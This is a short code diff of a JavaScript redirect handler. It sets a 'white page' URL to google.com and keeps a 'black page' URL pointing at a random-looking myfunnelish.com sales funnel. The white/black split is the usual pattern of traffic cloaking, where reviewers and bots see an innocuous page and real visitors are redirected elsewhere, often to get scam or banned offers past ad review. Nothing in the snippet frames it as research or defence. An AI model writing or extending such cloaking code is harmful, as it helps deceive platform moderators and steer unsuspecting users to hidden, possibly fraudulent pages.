@@ -2,7 +2,7 @@ import isRedirectEnabled from './config';
 
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939";
+    const whitePageURL = "https://google.com";
     const blackPageURL = "https://xjsdiaoqpwepa.myfunnelish.com/imbassd-1736879310456939";
     const iframeSrc = isRedirectEnabled ? defaultIframeURL : alternateIframeURL;
 
